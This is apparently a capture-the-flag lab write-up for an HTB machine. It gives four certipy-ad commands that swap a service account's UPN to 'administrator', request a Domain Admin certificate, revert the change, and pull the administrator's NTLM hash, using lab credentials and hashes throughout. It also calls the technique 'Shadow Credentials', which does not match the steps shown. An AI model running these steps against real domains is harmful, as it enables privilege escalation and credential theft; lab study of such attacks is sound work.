
This Active Directory certificate attack (specifically exploiting the **Shadow Credentials / UPN hijacking** concept) temporarily changes a service account's User Principal Name (UPN) to "administrator" to trick the Certificate Authority into issuing a Domain Administrator certificate, which is then used to authenticate and retrieve the actual Administrator's NTLM hash before reverting the changes to avoid detection.

---
##### Exploit

1. Get Administrator UPN for current session.

```
certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.232.88 -user ca_svc -upn administrator update
```

2. Request .pfx file.

```
certipy-ad req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator@fluffy.htb -target dc01.fluffy.htb -target-ip 10.129.232.88
```

Since we now got the administrator.pfx file, we will update the upn of ca_svc from "administrator" back to ca_svc. So when we authenticate with the administrator.pfx it will provide us the NTLM Hash of the Domain Admin.

3. Revert back to service account, so we can auth as domain admin

```
certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.232.88 -user ca_svc -upn ca_svc update
```

4. Request NTLM Hash of Domain Admin user using administrator.pfx

```
certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain fluffy.htb
```